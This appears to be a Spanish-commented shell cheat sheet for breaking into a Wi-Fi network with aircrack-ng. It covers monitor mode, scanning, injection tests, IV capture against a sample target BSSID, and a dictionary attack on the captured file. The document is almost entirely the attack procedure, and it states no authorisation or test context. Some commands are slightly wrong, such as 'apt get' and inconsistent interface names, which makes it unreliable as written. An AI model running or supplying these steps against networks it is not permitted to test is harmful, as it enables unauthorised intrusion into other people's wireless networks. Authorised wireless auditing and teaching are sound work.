sudo -i

ifconfig wlan1 down 
iwconfig wlan1 mode monitor 
iwconfig

# Debería estar en Mode:Monitor. Veamos detalles de redes accesibles:

iwlist wlan0 scan
iwlist wlan0 scan | egrep "Cell|Address|ESSID|Signal|Rates"

# Install aircrack-ng in Debian / Ubuntu

apt get update -y 
apt get install aircrack-ng -y

# Centos / Fedora
yum update -y 
yum install aircrack-ng -y

# Test de inyección:
 aireplay-ng -9 wlan0
 aireplay-ng -9 -i wlan1 wlan0
 
# Para monitorear las conexiones accesibles:

airodump-ng wlan1

# Encontramos la red que nos interesa y la atacamos.

aireplay-ng -9 -e RoWifi -a 00:14:6C:7E:40:80 wlan1
 
# Con esto ya podemos intentar la captura de paquetes (IV), es importante ajustar el canal -c. 

airodump-ng -c 1 --bssid 00:14:6C:7E:40:80 -w output wlan1
 
# Para el siguiente paso nos interesa utilizar el archivo output.cap

aircrack-ng -b 00:14:6C:7E:40:80 output.cap 

# Paso final:

aircrack-ng -b 00:14:6C:7E:40:80 output.cap -w mydiccionary.txt 

